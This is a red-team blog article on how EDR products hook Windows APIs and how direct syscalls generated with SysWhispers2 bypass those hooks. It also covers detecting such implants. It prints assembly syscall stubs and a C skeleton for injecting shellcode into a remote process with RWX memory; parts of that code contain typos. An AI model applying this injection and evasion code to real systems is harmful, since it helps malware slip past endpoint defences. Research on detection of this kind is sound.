---
draft: false
title: "Unleashing Direct Syscalls: Evading EDR Detection"
author: Tristan bui
publishDate: 2023-08-16T00:00:00Z
image: https://media.licdn.com/dms/image/D4E12AQGAWac5zALJTA/article-cover_image-shrink_720_1280/0/1692191973087?e=1716422400&v=beta&t=XIYGqNlnIfBGlH0oIn8zj3IM_YVcJEd8lOEulpB-VgY
excerpt: "Endpoint security remains a pressing concern for organizations, as they increasingly use antivirus (AV), endpoint protection (EPP), and endpoint detection and response (EDR) systems to protect against malware execution. "
category: Articles
tags:
  - EDR
  - Syscalls
  - Exploit
metadata:
  canonical: https://intuitem.com/direct-syscall-evading-edr
---

However, the evolving sophistication of attacks has prompted malicious hackers to explore new avenues for bypassing the security measures provided by traditional endpoint security solutions. Defenders, on the other hand much like a cat-and-mouse game of security, attempt to devise innovative methods to counter them. This ongoing dynamic leads to the emergence of new products designed to tackle evolving threats, as well as the adaptation, consolidation, or fading away of existing solutions.

In this brief post, we are going to share some insights on how EDR products work and discuss methods to circumvent them. Please note that this is purely based on our personal research to improve our understanding of EDR and does not cover any new or zero-day exploits.

## How does an EDR Work?

**Endpoint Detection and Response (EDR)** solutions use various methods to identify and prevent malicious or suspicious activities on an endpoint. These activities can occur from User-land or Kernel-land.

- **Static-based Detection**: EDR utilizes signature-based detection, where it compares the characteristics of files and processes against a vast database of known malware signatures, IoCs (Indicators of Compromise), and Yara rules. This approach helps quickly identify and block known threats.
- **Dynamic-based Detection**: EDR observes the behavior of code execution in a safe and isolated environment known as a sandbox. 
- **Heuristic-based Detection**: This involves analyzing runtime behavior and identifying actions that deviate from typical behavior exhibited by legitimate applications. For example, EDR can detect process execution or injection techniques and memory image loads that are often associated with cyberattacks. 

## API Hooks and Windows Architecture

The process architecture in Windows is divided into two access modes: User mode and Kernel mode. The goal of implementing these modes is to keep user applications from accessing and modifying memory areas containing essential OS data. All installed apps on a Windows system operate in user mode, whereas OS code such as system services and device drivers run in kernel mode.



![alt text](https://media.licdn.com/dms/image/D4E12AQEJn3eE_cy6-A/article-inline_image-shrink_1500_2232/0/1692191009760?e=1716422400&v=beta&t=5r6VSmIF-LFAwYGsbUmWmi8pA1Znddd_tXv9bxXMKok)

Kernel mode is a mode of execution in a processor that allows access to all system memory and all CPU commands.

![alt text](https://media.licdn.com/dms/image/D4E12AQFFRFmNvMYJkw/article-inline_image-shrink_1000_1488/0/1692191124949?e=1716422400&v=beta&t=CJG7Wq804XmaV7ByQtNf2SEZ_B0JHMqYROU1sp4tTAA)

Some x86 and x64 processors distinguish between these modes by referring to them as ring levels. On a Windows system, two of these rings are actually used. User-mode is the equivalent of ring 3 and kernel-mode which corresponds to ring 0.

## API Hooks and Syscall

Userland hooking is a technique used by the majority of AV/EDRs to intercept a function call and redirect the execution flow to a controlled environment where the call may be analyzed to determine whether or not it is malicious. 

Let's take an example scenario: when a process is executed and needs to allocate memory, it calls the Windows API function VirtualAlloc. Under the hood, this function utilizes a syscall like NtAllocateVirtualMemory, which is accessed through the ntdll.dll. As the execution flows, the EDR will hook triggers, and force the execution to redirect from the original syscall in the system DLL to the EDR's own DLL.

![alt text](https://media.licdn.com/dms/image/D4E12AQGjJIM5EDn8ZA/article-inline_image-shrink_1500_2232/0/1692191187836?e=1716422400&v=beta&t=qCkhnRfpQGzq5bPrdfSjH7F8fzGXzLQ63o8cxtNn_Xg)

Another term used for native API calls is system calls. In a manner similar to Linux, each system call corresponds to a specific number in the System Service Dispatch Table (SSDT) within the kernel. This table contains references to various kernel-level functions. Every named native API is linked to a syscall number, and each number maps to an entry in the SSDT. Knowing just the API name, like NtCreateThread, isn't sufficient to use a syscall; we must also know its associated syscall number. Moreover, syscall numbers can vary across Windows versions, service packs, and/or build numbers. 

The first and simpler approach for finding the Windows syscall numbers is by utilizing Mateusz Jurczyk's system call table. This table is a valuable tool for security researchers and developers seeking the syscall number associated with a particular API.

![alt text](https://media.licdn.com/dms/image/D4E12AQEMVWJaW6W0Hw/article-inline_image-shrink_1500_2232/0/1692191226013?e=1716422400&v=beta&t=gr-IEXcg5PiFASt1uxoseidxIqvuE6_tCv7l-dxj9rs)

The second approach for identifying syscall numbers is to study the source directly: ntdll.dll. To begin, we concentrate on getting the syscall number for NtAllocateVirtualMemory, which is required by our injector. To do so, we use WinDbg to look for the NtAllocateVirtualMemory method within ntdll.dll. 

For example, we attach to the notepad process and enter "x ntdll!NtAllocateVirtualMemory". This lets us examine the NtAllocateVirtualMemory function within the ntdll.dll. It returns a memory location for the function, which we examine, or unassemble, with the "u" command. Now we can see the exact assembly language instructions for calling NtAllocateVirtualMemory. Calling syscalls in assembly tends to follow a pattern, in that some arguments are setup on the stack, seen with the mov r10,rcx statement, followed by moving the syscall number into the eax register, shown here as mov eax,18h. So now we know the syscall number of NtAllocateVirtualMemory is 18 in hex .

![alt text](https://media.licdn.com/dms/image/D4E12AQFskGfmVgWwew/article-inline_image-shrink_1000_1488/0/1692191259772?e=1716422400&v=beta&t=FakvDdRjj7OCy4RThwvZIb62XhXDz8z0-QATtinDyjI)

## Bypass the Hooks - Direct Syscall

We insisted on the fact that EDR places its hooks in User-land, so it will inspect the parameters of a WinAPI function that will connect with a syscall. From an attacker's (red team's) point of view, what if we can build ourselves DLL or even use syscall directly? 

Even though we can obtain the syscall numbers more easily, it takes a long time to implement the numbers for each version. The SysWhispers project was built to avoid having to implement the numbers each time. SysWhispers is a utility that produces header and assembly pairs to make direct syscalls easier to use.

As shown in the code below, the SysWhispers2 version employs the function SW2_GetSyscallNumber rather than manually loading the syscall number. This function is in responsible of locating and storing the correct syscall number in the eax register based on the function name. Checking the list for syscall numbers ensures that the code is compatible with all versions of Windows. Despite differences in assembly syntax, the underlying semantics remain similar across Windows versions. This approach maintains consistent functionality regardless of Windows version, ensuring that the code remains effective and compatible. 

```asm
EXTERN SW2_GetSyscallNumber: PROC

WhisperMain PROC
    pop rax

    mov [rsp+ 8], rcx      ; Save registers.
    mov [rsp+16], rdx
    mov [rsp+24], r8
    mov [rsp+32], r9
    sub rsp, 28h

    mov ecx, currentHash
    call SW2_GetSyscallNumber
    add rsp, 28h
    mov rcx, [rsp+ 8]     ; Restore registers.
    mov rdx, [rsp+16]
    mov r8, [rsp+24]
    mov r9, [rsp+32]
    mov r10, rcx
    syscall.              ; Issue syscall
    ret

WhisperMain ENDP

NtAllocateVirtualMemory PROC
mov currentHash, 0C1512DC6h ; Load function hash into global variable.
call WhisperMain ; Resolve function hash into syscall number and

       make the call
NtAllocateVirtualMemory ENDP


NtCreateThread PROC
mov currentHash, 0922FDC85h ; Load function hash into global variable.
call WhisperMain ; Resolve function hash into syscall number and

       make the call
NtCreateThread ENDP
```
Let's take an example of injecting shellcode in a remote process. First, the malware creates a remote process (Handle) by using OpenProcess, then it needs to allocate memory (VirtualAllocEx) in order to write the shellcode into the remote process's newly allocated memory region with WriteProcessMemory. Finally, the shellcode is executed in the remote process by starting CreateRemoteThread. This is a simple flow of malware, and when we implement the use of syscall, the native equivalent syscalls of the Windows API are used. 

![alt text](https://media.licdn.com/dms/image/D4E12AQEoAbGb_0NYIg/article-inline_image-shrink_1500_2232/0/1692191319814?e=1716422400&v=beta&t=fHN8vLcoBDE7RPwV0E2RRSlWfGKMEquw6s7zkByAJm8)

Here is the baseline of code which utilizes the use of syscalls in this example. We also used SysWhisper2/3 to help us generate ASM/Header pair and compiled with Mingw and NASM assembler (on Windows use MASM instead). 

```c
#include <windows.h>
#include <stdio.h>
#include "syscalls.h"

int main(int argc, char* argv[]) {
    LPVOID pAddress = NULL;
    HANDLE hThread, hProcess;
    DWORD id;
	
    unsigned char payload[] = {0x8a, 0xb5, 0xaf,.....";
    SIZE_T payload_length= sizeof(payload);

    id = atoi(argv[1]);
    printf("PID: %i \n", id);  


    OBJECT_ATTRIBUTES objectAttributes = { sizeof(objectAttributes) };
    CLIENT_ID clientId = { (HANDLE)id, NULL };
    NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objectAttributes, &clientId);

    NtAllocateVirtualMemory(hProcess, &pAddress, 0, (SIZE_T)payload_length, MEM_COMMIT | MEM_RESERVE,  PAGE_EXECUTE_READWRITE);        

    NtWriteVirtualMemory)(hProcess, pAddress, &payload, sizeof(payload), NULL);
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, pAddress, NULL, FALSE, 0, 0, 0, NULL);
    NtClose(hProcess);
    return 0;
  }
```

## Observations

Based on various experiments, we discovered that while direct syscalls can initially evade some EDR solutions, their detection rate has increased over time due to enhanced Indicators of Compromise (IOCs) and developments in EDR technology. Our findings also show that the shellcode created by meterpreter is highly detectable, while other open-source Command and Control (C2) frameworks, such as Sliver and Havoc, have shown to be more effective at evading detection.

This method presented can be easily signatured. We can check the malicious functions using PEstudio. PEstudio is a powerful tool used for static analysis of PE files to identify potential indicators of malicious behavior and suspicious functions within executable files and DLLs. PEstudio may indicate a function or code segment as possibly harmful if it finds features often linked with malware or malicious behaviour.

We can see our detected implant was using some suspicious API calls and also cryptographic functions that may be used to encrypt or decrypt malicious payloads. 

![alt text](https://media.licdn.com/dms/image/D4E12AQEuOgHTyNlxXg/article-inline_image-shrink_1500_2232/0/1692191414955?e=1716422400&v=beta&t=FeLFB-Q-1Csw3CugbLk7OuOCpkTZI63WBWehbiw2heQ)

We may use the another approach as previously to identify direct syscalls in use, whether it’s a PE/shellcode sliced out of memory or an executable dropped to disc. In the instance of a simple PE, we can perform this with only objdump and grep in the case of a plain PE. Hence, EDR could also look for the presence of syscall instructions. 

![alt text](https://media.licdn.com/dms/image/D4E12AQH8_kkCHlQyqw/article-inline_image-shrink_1500_2232/0/1692191457368?e=1716422400&v=beta&t=e1ECNFZ1KRaX8tGYWYrk46Tn_68TBOAR4TiZYrAPm10)

To enhance evasion capabilities further, we have explored combining multiple techniques, including shellcode encryption and other tricks like patching the limitations of direct syscalls (legacy instructions, egg hunting, etc.). By employing these strategies, we have successfully bypassed EDR detection in certain scenarios. However, we acknowledge that the landscape is continuously changing, and staying ahead of EDR advancements requires ongoing research and adaptability in our approach.


## Conclusion

In conclusion, evading Endpoint Detection and Response (EDR) solutions is an ongoing and challenging endeavor. As EDR technology evolves to detect and respond to sophisticated attack techniques, red teamers and attackers still continuously discover and adapt their tactics. 

Personally, with all the theories covered, I am grateful for the invaluable insights shared by security researchers, whose dedication and knowledge have deepened my understanding of EDR's workings and evasion strategies. 

## References

- https://github.com/jthuraisamy/SysWhispers2
- https://github.com/klezVirus/SysWhispers3
- https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/
- https://alice.climent-pommeret.red/posts/direct-syscalls-hells-halos-syswhispers2/
- https://redops.at/en/blog/direct-syscalls-a-journey-from-high-to-low
- https://captmeelo.com/redteam/maldev/2021/11/18/av-evasion-syswhisper.html
- https://klezvirus.github.io/RedTeaming/AV_Evasion/NoSysWhisper/
- https://www.optiv.com/insights/source-zero/blog/endpoint-detection-and-response-how-hackers-have-evolved

